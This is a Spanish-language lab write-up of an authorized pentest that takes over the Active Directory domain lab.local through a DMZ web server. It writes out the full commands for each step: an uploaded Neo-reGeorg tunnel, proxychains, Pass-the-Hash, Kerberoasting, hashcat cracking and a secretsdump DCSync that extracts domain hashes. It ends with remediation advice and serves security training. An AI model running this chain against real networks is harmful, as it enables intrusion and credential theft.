# Compromiso de dominio Active Directory vía pivoting por DMZ

> Auditoría de intrusión en entorno de laboratorio: desde una Kali sin visibilidad
> de la red interna hasta **Domain Admin** en el controlador de dominio, atravesando
> una DMZ mediante un túnel HTTP.

**Tipo:** Red Team / pentest de infraestructura
**Entorno:** laboratorio académico (U-TAD)
**Resultado:** compromiso total del dominio `lab.local`

> ⚠️ **Nota:** ejercicio realizado en un entorno de laboratorio controlado y con
> autorización. Credenciales, hashes y flags se han ofuscado deliberadamente; el
> objetivo del writeup es documentar la **metodología**, no reproducir datos del
> escenario. Dominio e IPs son de la red privada del laboratorio.

---

## 1. Resumen

El escenario se compone de dos segmentos de red separados por una máquina intermedia:

| Máquina | Función | Red | IP |
|---|---|---|---|
| Kali | Atacante | NAT1 | `192.168.100.4` |
| jumpsrv (DMZ) | Pivote / servidor web | NAT1 + NAT2 | `192.168.100.20` / `10.10.10.X` |
| DC | Domain Controller (`lab.local`) | NAT2 | `10.10.10.10` |

El controlador de dominio está aislado en NAT2, **sin visibilidad directa** desde la
estación atacante. La cadena de compromiso encadena cuatro fases: enumeración del
servidor web de la DMZ → RCE vía subida de ficheros → pivoting a la red interna con un
túnel HTTP → Kerberoasting de una cuenta de servicio con privilegios de Domain Admin.

### Hallazgos

| # | Hallazgo | Severidad |
|---|---|---|
| 1 | Fichero de configuración con credenciales expuesto en `/backup/` | Crítica |
| 2 | Subida de archivos sin validación → ejecución remota de código | Crítica |
| 3 | Cuenta de servicio MSSQL (SPN) miembro de Domain Admins, Kerberoastable | Crítica |
| 4 | `sudo` mal configurado: `www-data` ejecuta `python3` sin contraseña | Crítica |
| 5 | Política de contraseñas débil (mín. 7 car., complejidad desactivada) | Alta |
| 6 | Política Kerberos con tiempos de vida excesivos (persistencia) | Media |

---

## 2. Enumeración de la DMZ

### 2.1. Descubrimiento de hosts

Barrido ARP sobre la red local, rápido y poco intrusivo (`-sn` = solo host discovery):

```bash
nmap -sn 192.168.100.0/24
```

Descartando Kali, el gateway y los servicios del hipervisor, quedan dos IPs candidatas.

### 2.2. Escaneo de servicios

```bash
nmap -sV -sC -O -p- 192.168.100.3 192.168.100.20 --open -oN nmap_dmz.txt
```

- `-sV` versión de cada servicio · `-sC` scripts NSE por defecto · `-O` fingerprinting de SO
- `-p-` los 65 535 puertos TCP · `--open` solo puertos abiertos · `-oN` evidencia en fichero

Ambas IPs comparten **las mismas claves SSH (ECDSA y ED25519)**: es la misma máquina con
dos interfaces, coherente con su rol de pivote. Puertos abiertos: `22/OpenSSH 8.9p1` y
`80/Apache 2.4.52` (portal interno corporativo) → la web es el vector principal.

### 2.3. Enumeración web

```bash
gobuster dir -u http://192.168.100.20 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,zip,bak,sql
```

Aparecen `/backup`, `/uploads` y `/upload.php` → copias de configuración + subida de ficheros.

---

## 3. Vulnerabilidades en la DMZ

### 3.1. Exposición de credenciales en `/backup/` (Crítica)

El directorio es accesible sin autenticación y contiene `config.txt` con credenciales de
BBDD **y** de la cuenta de sincronización con el dominio:

```ini
# Configuracion de la aplicacion
db_user=webapp
db_pass=**********

# Cuenta de sincronizacion con el dominio
domain_user=LAB.LOCAL\jsmith
domain_user_hash=<NTLM_HASH_OFUSCADO>
dc_ip=10.10.10.10
domain=lab.local
```

Lo grave no es la credencial de BBDD, sino el **hash NTLM de un usuario de dominio**
junto con la IP del DC y el FQDN: habilita **Pass-the-Hash** sin necesidad de crackear nada.
El propio fichero admite el problema en un comentario ("pendiente: migrar a método seguro").

### 3.2. Subida de archivos sin validación → RCE (Crítica)

`/upload.php` acepta cualquier fichero sin validar MIME, extensión ni contenido. Como
`/uploads/` es accesible por HTTP, se puede subir un fichero ejecutable e invocarlo,
logrando **RCE** en el contexto de `www-data`. Combinado con 3.1, convierte la DMZ en un
trampolín completo hacia la red interna.

---

## 4. Pivoting al controlador de dominio

### 4.1. Túnel HTTP con Neo-reGeorg

El DC (`10.10.10.0/24`) no es visible desde Kali. Se usa **Neo-reGeorg** para convertir el
Apache comprometido en un proxy SOCKS encapsulado sobre HTTP:

```bash
python3 neoreg.py generate -k <clave>
# se sube neoreg_servers/tunnel.php por el upload.php vulnerable
python3 neoreg.py -k <clave> -u http://192.168.100.20/uploads/tunnel.php --skip -p 8888
```

> Acceder al `tunnel.php` por navegador devuelve una página en blanco: es el comportamiento
> esperado — Neo-reGeorg solo responde a peticiones bien formadas de su cliente, lo que
> dificulta su detección.

### 4.2. proxychains

```ini
# /etc/proxychains4.conf
strict_chain
[ProxyList]
socks5 127.0.0.1 8888
```

Se configuran **timeouts altos** (`tcp_read_time_out 60000`): encapsular SOCKS sobre HTTP
añade latencia, y las herramientas multihilo agresivas provocan falsos negativos por
saturación del túnel. Reducir threads y subir timeouts lo mitiga.

### 4.3. Validación del túnel

```bash
proxychains nmap -sT -Pn -p 88,135,139,389,445,3389,5985 10.10.10.10
```

Se usa `-sT` (TCP connect) porque proxychains no soporta paquetes RAW (SYN scan). La cadena
`... 127.0.0.1:8888 ... 10.10.10.10:445 ... OK` confirma que el SMB del DC es alcanzable.

---

## 5. Compromiso del dominio

### 5.1. Pass-the-Hash contra el DC

```bash
proxychains impacket-smbclient lab.local/jsmith@10.10.10.10 \
  -hashes :<NTLM_HASH_OFUSCADO>
```

La sintaxis `:HASH` deja el LM vacío (deshabilitado en sistemas modernos). Autenticación
correcta → acceso a los shares, incluido **SYSVOL** (políticas de grupo del dominio).

### 5.2. Análisis de la política del dominio

En `SYSVOL\...\GptTmpl.inf`, la plantilla de seguridad revela una política muy débil:

```ini
[System Access]
MinimumPasswordLength = 7      ; solo 7 caracteres
PasswordComplexity   = 0       ; complejidad DESACTIVADA
LockoutBadCount      = 0       ; sin bloqueo por intentos fallidos

[Kerberos Policy]
MaxTicketAge = 99999           ; tickets prácticamente eternos
```

`LockoutBadCount=0` permite fuerza bruta y crackeo masivo offline sin riesgo de DoS sobre
los usuarios: es el facilitador directo del Kerberoasting siguiente.

### 5.3. Kerberoasting

Cualquier usuario autenticado puede pedir un TGS para cuentas con **SPN**; el ticket viene
cifrado con el hash NTLM de la cuenta de servicio → crackeo **offline**, sin ruido:

```bash
proxychains impacket-GetUserSPNs lab.local/jsmith \
  -hashes :<NTLM_HASH_OFUSCADO> \
  -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt
```

La cuenta `svc_sql` (`MSSQLSvc/db.lab.local:1433`) es **miembro de Domain Admins** — una
cuenta de servicio con privilegios de administrador del dominio, mala práctica grave.

### 5.4. Crackeo offline

TGS cifrado con RC4 → modo `13100` en hashcat, con `rockyou` + `best64.rule`:

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

Crackea en menos de un minuto (política débil). *(Contraseña recuperada no incluida.)*

### 5.5. Domain Admin y DCSync

```bash
proxychains impacket-smbclient lab.local/svc_sql:<PASS>@10.10.10.10   # acceso a C$
proxychains impacket-secretsdump lab.local/svc_sql:<PASS>@10.10.10.10 # DCSync
```

`secretsdump` extrae por **DCSync** los hashes NTLM del dominio, incluidos `Administrator`
y `krbtgt` (cuya posesión permite generar **Golden Tickets**), y vuelca el NTDS.dit.

### 5.6. Verificación por RDP

```bash
proxychains xfreerdp /v:10.10.10.10 /d:lab.local /u:svc_sql /p:<PASS> \
  /cert:ignore /tls:seclevel:0
```

Los errores `Cannot find KDC for realm` son informativos: al no resolver el KDC por DNS,
xfreerdp cae a NTLM y la sesión se establece. La pantalla de Windows Server confirma acceso
**Domain Admin** funcional.

---

## 6. Recomendaciones

- **No exponer ficheros de configuración**: mover `/backup/` fuera del webroot; nunca
  almacenar hashes/credenciales de dominio en la aplicación.
- **Validar las subidas**: whitelist de extensiones y MIME, almacenamiento fuera del webroot,
  renombrado y sin permisos de ejecución sobre `/uploads/`.
- **Cuentas de servicio**: contraseñas largas y aleatorias (gMSA), **nunca** en Domain Admins;
  aplicar el mínimo privilegio.
- **Política de dominio**: mínimo 14 caracteres, complejidad activada, `LockoutBadCount > 0`.
- **Kerberos**: reducir los tiempos de vida de ticket a valores razonables.
- **Segmentación**: la DMZ no debería poder abrir tráfico arbitrario hacia la red interna.

---

## Técnicas y herramientas

`nmap` · `gobuster` · Neo-reGeorg · `proxychains` · Pass-the-Hash · `impacket`
(`smbclient`, `GetUserSPNs`, `secretsdump`/DCSync) · Kerberoasting · `hashcat` · `xfreerdp`

**Mapa ATT&CK (resumen):** T1190 (explotación de app web) · T1090 (proxy/tunneling) ·
T1550.002 (Pass-the-Hash) · T1558.003 (Kerberoasting) · T1003.006 (DCSync)
